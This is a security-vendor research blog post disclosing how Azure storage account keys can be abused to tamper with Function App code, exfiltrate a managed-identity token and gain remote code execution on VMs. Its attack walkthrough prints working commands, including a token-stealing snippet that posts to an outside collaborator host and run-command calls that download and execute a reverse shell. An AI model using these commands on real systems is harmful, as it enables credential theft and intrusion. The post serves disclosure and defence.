---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-04-11_from-listkeys-to-glory-how-we-achieved-a-subscription-privilege-escalation-and-r.md
original_filename: 2023-04-11_from-listkeys-to-glory-how-we-achieved-a-subscription-privilege-escalation-and-r.md
title: 'From listKeys to Glory: How We Achieved a Subscription Privilege Escalation
  and RCE by Abusing Azure Storage Account Keys'
category: documents
detected_topics:
- cloud-security
- access-control
- api-security
- supply-chain
- oauth
- sso
tags:
- imported
- documents
- cloud-security
- access-control
- api-security
- supply-chain
- oauth
- sso
language: en
raw_sha256: c0bf7a260a7808f0b454dd78e795cc16144bb7927027c74aaccd1820b4aadb42
text_sha256: 1a6af7f0489494abde1da5b8a37090e6ce76a29e2ca31c3cb9f52818583fd226
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: false
---

# From listKeys to Glory: How We Achieved a Subscription Privilege Escalation and RCE by Abusing Azure Storage Account Keys

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-04-11_from-listkeys-to-glory-how-we-achieved-a-subscription-privilege-escalation-and-r.md
- Source Type: markdown
- Detected Topics: cloud-security, access-control, api-security, supply-chain, oauth, sso
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: False
- Raw SHA256: `c0bf7a260a7808f0b454dd78e795cc16144bb7927027c74aaccd1820b4aadb42`
- Text SHA256: `1a6af7f0489494abde1da5b8a37090e6ce76a29e2ca31c3cb9f52818583fd226`


## Content

---
title: "From listKeys to Glory: How We Achieved a Subscription Privilege Escalation and RCE by Abusing Azure Storage Account Keys"
page_title: "Microsoft Azure Shared Key Authorization Exploitation"
url: "https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/"
final_url: "https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/"
authors: ["Roi Nisimi (@roinisimi)"]
programs: ["Microsoft (Azure)"]
bugs: ["Cloud", "Privilege escalation"]
publication_date: "2023-04-11"
added_date: "2023-04-15"
source: "pentester.land/writeups.json"
original_index: 1280
---

[ Blog Home](https://orca.security/resources/blog/)

  * [ Research Pod ](https://orca.security/resources/category/research-pod/)

![From listKeys to Glory: How We Achieved a Subscription Privilege Escalation and RCE by Abusing Azure Storage Account Keys](https://orca.security/wp-content/uploads/2023/04/Blog-graphic_Azure-listKeys_Cover.jpg?w=1044)

# From listKeys to Glory: How We Achieved a Subscription Privilege Escalation and RCE by Abusing Azure Storage Account Keys

[ ![Avatar of Roi Nisimi](https://orca.security/wp-content/uploads/2023/01/roi-nisimi_avatar.png) Roi Nisimi  ](https://orca.security/resources/author/roi-nisimi/)

Published: Apr 11, 2023 

  * [ __](https://twitter.com/share?text=From%20listKeys%20to%20Glory%3A%20How%20We%20Achieved%20a%20Subscription%20Privilege%20Escalation%20and%20RCE%20by%20Abusing%20Azure%20Storage%20Account%20Keys&url=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-shared-key-authorization-exploitation%2F)
  * [ __](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-shared-key-authorization-exploitation%2F)
  * [ __](https://www.facebook.com/sharer.php?u=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-shared-key-authorization-exploitation%2F)
  * [ __](mailto:?Subject=From listKeys to Glory: How We Achieved a Subscription Privilege Escalation and RCE by Abusing Azure Storage Account Keys&body=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-shared-key-authorization-exploitation%2F)

Here at Orca Security, our team of cloud researchers are continually pushing the cloud security limits to ensure that we cover the latest cloud security risks on our [Orca Platform](https://orca.security/platform/) and find cloud infrastructure vulnerabilities before bad actors do. 

On what started as one of these typical days, we went on to discover a surprisingly critical exploitation path utilizing Microsoft Azure Shared Key authorization – a secret key-based authentication method to storage accounts. With this key, obtained either through a leakage or appropriate AD Role, an attacker can not only gain full access to storage accounts and potentially critical business assets, but also move laterally in the environment and even execute remote code. 

Due to other known risks, Microsoft already [recommends](https://learn.microsoft.com/en-us/azure/storage/common/shared-key-authorization-prevent?tabs=portal) disabling shared key access and advises using Azure Active Directory authentication instead. However, shared key authorization is still _enabled by default_ when creating storage accounts. 

Upon discovering this new exploitation path, we contacted the Microsoft Security Response Center (MSRC) who shared they don’t consider this a vulnerability but a by-design flaw, and are planning updates to provide improved safeguards for their customers which include changes to storage account defaults from Functions experiences. They further shared that the Storage Blob Data Reader or Storage File Data SMB Share Reader are built-in roles that can grant permission to read storage account contents. Additional details can be found in the [MSRC blog](https://msrc.microsoft.com/blog/2023/04/best-practices-regarding-azure-storage-keys-azure-functions-and-azure-role-based-access/).

At Orca we immediately went to work to help our customers reduce their exposure to this risk by alerting when entities are found with the Azure **listKeys** permission, so organizations can disable this permission for users that don’t strictly need it, following the principle of **least-privilege.**

In this blog, we describe how we found the exploitation path and provide recommendations on how organizations should protect themselves against this risk.

If you would like to find out more about how Orca can help mitigate this risk, we will be happy to [set up a meeting with you at the Orca RSA booth #527](https://orca.security/lp/rsa-23-meeting/) in San Francisco (April 24-27) and answer any questions you have. Alternatively, please [schedule a virtual 1:1 demo](https://orca.security/demo/) when convenient to you and we can provide you with a walk through.

## Executive Summary

  * Orca discovered that it is possible to abuse and leverage Microsoft Storage Accounts by manipulating Azure Functions to steal access tokens of higher privileged identities, move laterally, access critical business assets, and execute remote code (RCE). 
  * Due to other known risks, Microsoft already warns that allowing storage authorization with access keys is inappropriate for scenarios where granular access is required since this can expose organizations to a higher security risk. Although not recommended by Microsoft, shared key authorization is still _enabled by default_ on Azure Storage Accounts. 
  * After sharing this discovery with the Microsoft Security Response Center, they advised that although they consider this to be an important risk, it is not a vulnerability, but rather a _by-design flaw_ , which cannot be fixed without making significant changes to the system’s design. However, this does not mean that it is less dangerous. Actually, it should be considered even more dangerous since there is no straightforward ‘fix’.
  * To mitigate this risk, if possible, organizations should _disable_ Azure Shared Key authorization and use Azure Active Directory authentication instead. 
  * In addition, by implementing the principle of least-privilege, this risk (and other risks) can be greatly reduced. The Orca Platform can help organizations accomplish this by alerting when entities are found with assigned roles that contain the **listKeys** permission, so they can be adjusted according to the principle of **least-privilege.**
  * To read more about the ways in which organizations can protect themselves from this risk, refer to the [Microsoft blog](https://msrc.microsoft.com/blog/).

## By-Design Flaw Versus Vulnerability

So why is this not a vulnerability? Since we were able to abuse Storage Accounts due to the way Microsoft designed the system, rather than a security weakness in the product, this is considered a ‘by-design flaw’. However, this does not mean that it is less dangerous.

Even though there is a security risk, a design flaw may not always be possible or practical to fix. Further, the fact that Azure Shared Key authorization is already in use and many systems depend on it tremendously increases the severity of this discovery.

Unfortunately this is an attacker’s bread-and-butter and can be abused repeatedly, exposing organizations with weak security postures to an infinite threat. Similar to the abuse of public AWS S3 buckets seen in recent years, attackers can also look for and utilize Azure access keys as a backdoor into an organization.

## The Exploitation Path That Orca Discovered

To cut straight to the point – with full-access permission to storage accounts, an attacker within the cloud environment can easily sift out dedicated storage accounts, which host Azure functions’ sources, and manipulate their code.

Through this code manipulation, the attacker can steal and exfiltrate an access-token of the Azure Function App’s assigned managed-identity and escalate privileges, which can allow it to move laterally, access new resources, and even execute remote code on Virtual Machines.

Each step will be explained in further detail below, but we will first dive into the theory behind Shared Key authorization, which makes this attack path extremely risky. 

![](https://orca.security/wp-content/uploads/2024/01/image-548.png)

## The Theory Behind Storage Account Keys

Certain entities in your organization need to consume data. Whether they are new employees accessing their onboarding or applications parsing configuration files – these identities require READ access to data. But, it doesn’t mean they should be granted the ability to manipulate/change it. Right? A pretty straightforward scenario which most likely fits any medium to large-size organization.

What role will you assign to these entities? Before answering this question, let’s explain more about Azure roles and Storage Account Keys.

### What are Azure Storage Account Keys?

Azure storage accounts host different data objects, the most common ones being [blobs](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blobs-introduction) and [file shares](https://learn.microsoft.com/en-us/azure/storage/files/storage-files-introduction). By default, Azure Storage account requests can be authorized with either Azure Active Directory (Azure AD) credentials or by using the account access key for Shared Key authorization. Of these two types of authorization, Azure AD provides superior security and ease of use over Shared Key authorization, and is recommended by Microsoft.

According to [Microsoft](https://learn.microsoft.com/en-us/azure/storage/common/storage-account-keys-manage?tabs=azure-portal): “When you create a storage account, Azure generates two 512-bit storage account access keys for that account.” They further explain that these keys “are similar to a root password for your storage account,” and also emphasize that “Disallowing Shared Key access is recommended as a **security best practice**.”

Wait. What?

I can feel my Orca senses tingling. Here we have default behavior, but it is highly recommended to disallow it as a security best practice. That just doesn’t sound right to me.

Microsoft says that because anyone who can get their hands on one of these keys can authorize access to data via [Shared Key Authorization](https://learn.microsoft.com/en-us/rest/api/storageservices/authorize-with-shared-key) and essentially get full access to a storage account, they recommend using Azure AD authorization instead, and link to an article on how to [Prevent Shared Key authorization](https://learn.microsoft.com/en-us/azure/storage/common/shared-key-authorization-prevent?tabs=portal).

### So, What Role Would You Choose?

You may be tempted to use the BuiltIn-type **Reader** role, but you will find that it allows the entity to view not only storage accounts, but also virtual machines, function-apps and essentially everything inside a particular subscription. We don’t want that.

Another problem with choosing the Reader role, is ‘Access Denied’ to storage account data objects, due to this:

![](https://orca.security/wp-content/uploads/2024/01/image-549.png?w=869)

As we can see, **Microsoft.Storage/storageAccounts/listKeys/action** is a required permission for an entity seeking to read data objects. As the name suggests, listKeys allows listing access keys of storage accounts. So if a storage account is configured by default with Shared Key authorization, and we can’t list its access keys, it’s impossible to access data.

When discussing this with Microsoft they highlighted that the [Storage Blob Data Reader](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#storage-blob-data-reader) or [Storage File Data SMB Share Reader](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#storage-file-data-smb-share-reader) can be used as appropriate built-in roles to read storage account content, without the **listKeys** permission. However while this is true for Storage Blob Data Reader, when we used the Storage File Data SMB Share Reader role we still got the above error. As explained to us by Microsoft, the error is seen when the user tries to access file shares using the Azure portal. It is not shown when accessing blob data. In April, Files will introduce support for Oauth over REST in public preview. The portal will be updated at that time to refer to more granular permissions. 

You may now understand that you should choose a role that includes **listKeys** permissions. So you might browse the available BuiltIn-type roles and find an attractive role named **Storage Account Contributor**. It has the listKeys permissions, but it doesn’t have DataActions. So you go ahead and clone this role to create a custom one that also has Read-only permissions inside the DataActions.

![](https://orca.security/wp-content/uploads/2024/01/image-550.png?w=1200)

Bingo! Right? Not really. Let’s take a small break to understand the Azure difference between Actions and DataActions, or better-termed [Control plane and Data plane](https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/control-plane-and-data-plane).

### Control Plane Versus Data Plane

Simply put, control plane actions are management operations, performed on the resources themselves, while data plane actions are operations performed on data. According to [Microsoft](https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/control-plane-and-data-plane): “You can create a storage account through the control plane. You use the data plane to read and write data in the storage account.”

So it turns out we need DataActions permissions in order to read storage account data. But this is a **wrong** and **misleading** ‘fact’. The clear distinction between control plane and data plane permissions has a sneaky anomaly, which is **Microsoft.Storage/storageAccounts/listKeys/action** – a control plane permission that enables full operations on data.  
---  
  
Continuing with our example, we can indeed read data objects with our newly created custom role. However, we can also **modify and delete** them, because as you can see in the image below, the default Authentication method is ‘Access key’, and access-keys grant root permissions. The DataActions permissions in this case are completely meaningless.

![](https://orca.security/wp-content/uploads/2024/01/image-551.png?w=1200)

This is extremely confusing, and may lead to unintentional misconfigurations. You may think that the Storage Account Contributor Role can only manage storage accounts, without the ability to read and manipulate data. Or worse, think that if you create the above custom role then it can only read data, without the ability to manipulate it. This potential misunderstanding can be abused, and down the line also cause security breaches.

### Storage Account Keys – So What?

The ability for a potential attacker to read and manipulate data can have an obvious and immediate impact on an organization. But can storage account key abuse also be utilized to move laterally inside the cloud environment?

There is a direct connection between Azure Storage Accounts and **Function Apps**. When you deploy a Function App, a dedicated storage account is created. This storage account hosts all functions’ source code inside a particular file share. The storage account of a Function App can be found inside the **AzureWebJobStorage** environment variable under Application Settings, which includes a connection string to the storage account, together with one of the storage account keys.

For example, we can see the matched storage account of the function app **MyOrcaFunctionApp** is **myorcafunctionsa22a**.

![](https://orca.security/wp-content/uploads/2024/01/image-552.png?w=1200)

This is crucial because now file manipulation also equals code manipulation. And code manipulation increases the variety of objectives of a malicious actor inside an organization.

Azure functions may be extremely critical for the main functionality of a SaaS company, so there is no doubt any malicious interference can severely damage the organization’s operational level. But what if the Azure Function App is also assigned with a **strong role**? More accurately, what if the Function App is assigned with a strong managed identity, that it uses to connect to other resources? This is not far-fetched, since [managed identities](https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview) became very popular in recent years after their launch in 2018. So the following question is: can code manipulation also be used to steal a Function App’s identity? To answer this question, we’ll describe each step of the attack flow below.

## Steps of the Azure Storage Exploitation Path Discovered by Orca

### List Storage Accounts: Attack Flow Steps 1 and 2

Let’s assume you assigned one of your employees – Chris Green – a Storage Account Contributor role. Whether you understood the capabilities behind it or not, one thing is for sure. This user can’t access or view anything besides Storage Accounts.

![](https://orca.security/wp-content/uploads/2024/01/image-553.png?w=1200) ![](https://orca.security/wp-content/uploads/2024/01/image-554.png?w=1200)

If this user is compromised by hackers, they will have full-control over storage account data. This is already bad, but at least they can’t connect to anything else, like VMs, Function Apps and Managed or Unmanaged Databases, which can be **devastating**. Or can they?

Chris Green can list all storage accounts names in a subscription, and not only that, he can read and write all data objects in any one of them. We already know that Function Apps host their source code inside dedicated storage accounts, so in order to compromise a Function App, Chris really just needs a way to filter out these function-related storage accounts.

When you create a new function inside a Function App, a configuration file called ‘host.json’ is created inside a file share in this path **site/wwwroot/host.json**. Following our previous example, we created a function named **HttpTrigger1** under **MyOrcaFunctionApp**. We can see the host.json file was created under the file share **myorcafunctionapp9f04**.

![](https://orca.security/wp-content/uploads/2024/01/image-555.png?w=1200)

This is a unique and recurring signature. If an attacker manages to compromise Chris’ identity, they can use this technique in order to filter-out all function-related storage accounts, and the associated file shares which hosts source code.

az storage account list | jq ‘.[].name’ | xargs -L1 az storage account show-connection-string -n | jq ‘.connectionString’ | python3 scripts/is_function_account.py  
---  
  
This one-liner demonstrates an example of how an attacker could achieve this goal. It lists all storage accounts keys (connection-strings) and pipes them into a script implementing the described above technique. Doing this generates a lot of activity log events in a way that can be immediately spotted as suspicious.

![](https://orca.security/wp-content/uploads/2024/01/image-556.png?w=1200)

But since ‘List Storage Account Keys’ is a legitimate operation that is recorded every time someone accesses a storage account (even through the portal), an attacker can easily be more stealthy using the below command – leaving almost no chance for the IT and Security teams to notice what is happening.

az storage account list | jq ‘.[].name’ | awk ‘{print $1}’ | xargs -I % sh -c ‘{ az storage account show-connection-string -n %; sleep X; }’ | jq ‘.connectionString’ | python3 is_function_account.py  
---  
 _X = the number of seconds to wait between each List Storage Account Keys operation_

Eventually, the attacker receives a list of target storage accounts and their relevant nested file shares. Most often, the storage account will have a similar name to the Function App, or the parent Resource Group, implying the functions’ objectives. In our example, we can see below all storage accounts hosting Function Apps, with one interesting storage account named **monitorvms98d0**. This name is intriguing, because it may provide a hint as to the Function App’s identity role.

![](https://orca.security/wp-content/uploads/2024/01/image-557.png?w=1200)

### Steal Function App Identities: Attack Flow Step 3

With a storage account at its disposal, the attacker can now list all function names inside the Function App and read their source code. Let’s follow our example.

az storage directory list –account-name monitorvms98d0 –share-name monitorvmsapp9dde -n site/wwwroot –only-show-errors | jq ‘.[].name’  
az storage file list –account-name monitorvms98d0 –share-name monitorvmsapp9dde -p site/wwwroot/GetInstanceView –only-show-errors | jq ‘.[].name’  
az storage file download –account-name monitorvms98d0 –share-name monitorvmsapp9dde -p site/wwwroot/GetInstanceView/__init__.py –only-show-errors  
---  
![](https://orca.security/wp-content/uploads/2024/01/image-558.png?w=1200)

We can see there is one function hosted by this storage account named **GetInstanceView**. This function is Python-based, and its main code file is **__init__.py**. We download the code file and get this:

![](https://orca.security/wp-content/uploads/2024/01/image-559.png?w=1051)

A quick overview is required to understand that this function’s goal is to get the [instance view](https://learn.microsoft.com/en-us/rest/api/compute/virtual-machines/instance-view?tabs=HTTP) of a Virtual Machine in a particular subscription and resource group. But even more interesting – the function is utilizing its managed identity in order to achieve this, through [DefaultAzureCredential](https://learn.microsoft.com/en-us/python/api/overview/azure/identity-readme?view=azure-python).

So the attacker reads this code and understands two things:

  1. There is a managed identity assigned to this Function App
  2. The managed identity’s role can execute a command under the Azure Resource Manager Provider – management.azure.com

It now turns out that if we could compromise this identity, we might be able to execute any API call under management.azure.com, including [List VMs](https://learn.microsoft.com/en-us/rest/api/compute/virtual-machines/list?tabs=HTTP) and [Run Command](https://learn.microsoft.com/en-us/rest/api/compute/virtual-machines/run-command?tabs=HTTP).

At this point stealing credentials and **Escalating Privileges** , as scary as it may sound, is fairly easy. Once an attacker locates the Storage Account of a Function App that is assigned with a strong managed identity, it can run code on its behalf and as a result acquire a **subscription privilege escalation (PE)**. 

Here’s an example of 3 lines of code an attacker can use in order to hijack the managed-identity access-token.
  
  
  import os, subprocess resp = subprocess.getoutput(f"curl -s **\"**{os.getenv('IDENTITY_ENDPOINT')}/?resource=https://management.azure.com/&api-version=2019-08-01**\"** -H **\"** X-IDENTITY-HEADER: {os.getenv('IDENTITY_HEADER')}**\"** ") subprocess.call(f"curl -s -X POST -d **\"**{resp}**\"** https://z666pmtao2oo54idrqmpfqey3p9gx6lv.oastify.com", shell=**True**)

This short code will abuse the function’s environment variables – IDENTITY_ENDPOINT and X-IDENTITY-HEADER in order to request a scoped (management.azure.com) access-token of the managed identity, and then exfiltrate it to a third-party server an attacker holds – https://z666pmtao2oo54idrqmpfqey3p9gx6lv.oastify.com.

The attacker can add these lines on top of the __init__.py and then use the command below to override the original code:
  
  
  az storage file upload --account-name monitorvms98d0 --share-name monitorvmsapp9dde -p site/wwwroot/GetInstanceView/__init__.py --source __init__.py --only-show-errors

![](https://orca.security/wp-content/uploads/2024/01/image-560.png?w=1150) ![](https://orca.security/wp-content/uploads/2024/01/image-561.png?w=1200)

And we now have a malicious function uploaded to production. And not only that, there are absolutely **zero** traces to this operation, since the Azure Activity-Log **doesn’t record events** on storage accounts data objects made through Azure-CLI / REST API. However, this Data plane activity can be enabled in the Storage account diagnostic settings which can log write and/or read.

The exfiltration server is a BurpSuite collaborator address, so we can open BurpSuite and wait for the next time this function will get executed, and when it does we get this:  

![](https://orca.security/wp-content/uploads/2024/01/image-562.png?w=1200)

The Privilege-Escalation vector is now complete.

### Using Access-tokens to Move Laterally: Attack Flow Steps 4 and 5

Now that we have successfully obtained the access-token, let’s investigate how it can be used. We already know the token was generated for the **management.azure.com** resource provider, and we also have the response json as an approval.

An attacker can now utilize this access-token in order to list all the VMs in the subscription, using this API request: 
  
  
  curl -s -X GET --header "Authorization: Bearer <token>" "https://management.azure.com/subscriptions/<subscription-id>/providers/Microsoft.Compute/virtualMachines?api-version=2022-11-01"| jq '.value[] | "\(.name) - \(.id)"'

![](https://orca.security/wp-content/uploads/2024/01/image-563.png?w=1200)

Out of all the VMs, one looks highly interesting – **CustomersDB**. The attacker can now try to upload and execute a reverse shell on this VM, using the below API calls:
  
  
  curl -s -X POST --header "Authorization: Bearer <token>" --header "Content-Type: application/json" "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.Compute/virtualMachines/<vm-name>/runCommand?api-version=2018-06-01" -d "{**\"** commandId**\"** : **\"** RunShellScript**\"** ,**\"** script**\"** : [**\"** wget https://<ngrok-https>/revshell.sh -O /tmp/revshell.sh**\"**]}"
  
  curl -s -X POST --header "Authorization: Bearer <token>" --header "Content-Type: application/json" "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.Compute/virtualMachines/<vm-name>/runCommand?api-version=2018-06-01" -d "{\"commandId\": \"RunShellScript\",\"script\": [\"chmod +x /tmp/revshell.sh\"]}"
  
  curl -s -X POST --header "Authorization: Bearer <token>" --header "Content-Type: application/json" "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.Compute/virtualMachines/<vm-name>/runCommand?api-version=2018-06-01" -d "{\"commandId\": \"RunShellScript\",\"script\": [\"bash /tmp/revshell.sh <ngrok-tcp> <ngrok-tcp-port>\"]}"

These commands will in turn: 

  1. Upload a reverse-shell to the remote VM
  2. Assign execute permissions to the reverse-shell
  3. Execute the reverse-shell

![](https://orca.security/wp-content/uploads/2024/01/image-564.png?w=1200) ![](https://orca.security/wp-content/uploads/2023/04/Blog-image_Azure-keys_ngrok.png)_Example: Downloading a reverse-shell from the attacker’s server_ ![](https://orca.security/wp-content/uploads/2024/01/image-565.png?w=1200)_Example: Setting write permissions to the reverse-shell in the remote VM_ ![](https://orca.security/wp-content/uploads/2024/01/image-566.png?w=1192) ![](https://orca.security/wp-content/uploads/2024/01/image-567.png?w=1094)_Example: Executing the reverse-shell and acquiring a remote shell_

### Attack Path Summary

We have witnessed how it is possible to escalate privileges in Microsoft Azure only through accessing storage accounts. This attack-flow scenario is possible if an AD User with listKeys permissions is being compromised (as in our example), but also if storage accounts’ connection-strings/access-keys are leaked. By overriding function files in storage accounts, an attacker can steal and exfiltrate a higher-privileged identity and use it to move laterally, exploit and compromise victims’ most valuable crown jewels.

## How To Mitigate The Shared Key Authorization Risk

As with every other permissions system, it is best to follow the Principle of **least-privilege**. To do that, system administrators must be familiar with the environment they interact with. Applying the principle of least-privilege would most likely prevent the described above attack vector, but only if one was able to uncover what it doesn’t know it doesn’t know – listKeys is a **broad-permission** that grants full access to data in a default Azure environment.

Following Microsoft’s [advice](https://learn.microsoft.com/en-us/azure/storage/common/shared-key-authorization-prevent?tabs=portal#update-the-azure-policy-to-prevent-allowing-shared-key-access), disabling shared-key authorization is the best way to allow a [granular](https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/overview) and secret-free permission system. Authorizing requests with Azure AD credentials will decrease fear of leaked secrets and eliminate the all-or-nothing approach of storage account keys. That way you could create the discussed role from this blog’s first paragraph, and also update [AzureWebJobsStorage](https://learn.microsoft.com/en-us/azure/azure-functions/functions-reference?tabs=blob#connecting-to-host-storage-with-an-identity-preview) to connect to a storage account with an identity.

But it can be just too hard to implement immediately. If you are a veteran Azure customer, you must have many applications that rely on Shared Key Authorization. So where do you start? Migrating the entire environment to use Azure AD authorization instead can get tedious and exhausting. 

To address this issue, we suggest starting with identifying all entities with top-level (subscription/resource-group) assigned roles which contain the **listKeys** permission, and alter them according to the principle of **least-privilege**. listKeys**** can be included in an assigned role, through a specific Resource IAM panel, and as a result allow full-access only to this particular resource. This is where Orca can assist.

## How Can Orca Help?

The Orca Platform can help security teams by identifying which users currently have the listKeys permissions, and alert to any suspicious activity that could indicate unusual activity in storage accounts.

### Detect Azure listKeys Permissions

In order to assist organizations in mitigating this risk, the Orca Cloud Security Platform alerts on any Azure entities that have the potentially dangerous **Microsoft.Storage/storageAccounts/listKeys/action** permission. In this way, organizations can remove this permission for all users that do not need it for their daily activities, applying the least-privilege principle and greatly reducing this risk.

![Azure listKeys Permissions](https://orca.security/wp-content/uploads/2023/04/Orca-listkeys-alert.png)

### Detect Suspicious Behaviors

When enabling data plane activity in Storage Accounts as mentioned above, Orca’s [Cloud Detection and Response](https://orca.security/platform/cloud-detection-and-response-cdr/) capabilities can help mitigate this risk in near real-time, alerting to suspicious actions and anomalous behavior. Organizations will then be able to take preventive action as needed.

![](https://orca.security/wp-content/uploads/2024/01/image-568.png?w=1200)

## Learn More About The Orca Platform

The Orca Cloud Security Platform detects, prioritizes, and remediates risks and compliance issues across your cloud estate spanning AWS, Azure, Google Cloud, Alibaba Cloud, Oracle Cloud, and Kubernetes. To find out more, [watch a 10-minute demo video](https://orca.security/demo/) of the Orca Platform.  
Ready to get hands on? Sign up for our free, no-obligation, [30-day risk assessment](https://orca.security/lp/cloud-security-risk-assessment/), get set up in 30 minutes and experience first-hand how Orca can save your security and development teams valuable time and dramatically improve your cloud security posture.

  * [ __](https://twitter.com/share?text=From%20listKeys%20to%20Glory%3A%20How%20We%20Achieved%20a%20Subscription%20Privilege%20Escalation%20and%20RCE%20by%20Abusing%20Azure%20Storage%20Account%20Keys&url=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-shared-key-authorization-exploitation%2F)
  * [ __](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-shared-key-authorization-exploitation%2F)
  * [ __](https://www.facebook.com/sharer.php?u=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-shared-key-authorization-exploitation%2F)
  * [ __](mailto:?Subject=From listKeys to Glory: How We Achieved a Subscription Privilege Escalation and RCE by Abusing Azure Storage Account Keys&body=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-shared-key-authorization-exploitation%2F)

## Related articles

[ ![Risk-based Vulnerability Management](https://orca.security/wp-content/uploads/2025/02/orca-blog-risk-prioritization-featured.png?w=750) ](/resources/blog/risk-based-vulnerability-management/)

![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-blue.svg) ![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-white.svg)

Product Info

##  [Risk-Based Vulnerability Management for the Cloud: A 2026 Guide](/resources/blog/risk-based-vulnerability-management/ "Risk-Based Vulnerability Management for the Cloud: A 2026 Guide")

Jun 26, 2026 

[ ![Digital illustration of a data center cross-section showing an adversarial path indicated by glowing red arrows originating from a breached, orange-lit server rack and moving laterally toward a secured, cyan-lit server enclosure with a locked terminal.](https://orca.security/wp-content/uploads/2026/06/orca-blog-private-cloud-security-1.png?w=750) ](/resources/blog/private-cloud-security/)

![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-blue.svg) ![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-white.svg)

Cloud Security Learning

##  [Private Cloud Security: Top Risks and Best Practices (2026)](/resources/blog/private-cloud-security/ "Private Cloud Security: Top Risks and Best Practices \(2026\)")

Jun 26, 2026 

[ ![Digital illustration of a central AI microchip on a cloudy background, processing threats from the left—such as a cracked message bubble and a bug icon—and outputting cybersecurity solutions on the right, including prioritized alert windows and a remediation code terminal.](https://orca.security/wp-content/uploads/2026/06/orca-blog-what-is-generative-ai-in-cybersecurity-1.png?w=750) ](/resources/blog/what-is-generative-ai-in-cybersecurity/)

![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-blue.svg) ![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-white.svg)

Cloud Security Learning

##  [What Is Generative AI in Cybersecurity?](/resources/blog/what-is-generative-ai-in-cybersecurity/ "What Is Generative AI in Cybersecurity?")

Jun 25, 2026 

### Stay in the loop

Keep up to date with everything you need to know about cloud security and our latest research

By submitting my email address I agree to the use of my personal data in accordance with Orca Security [ Privacy Policy](https://orca.security/privacy-policy/).
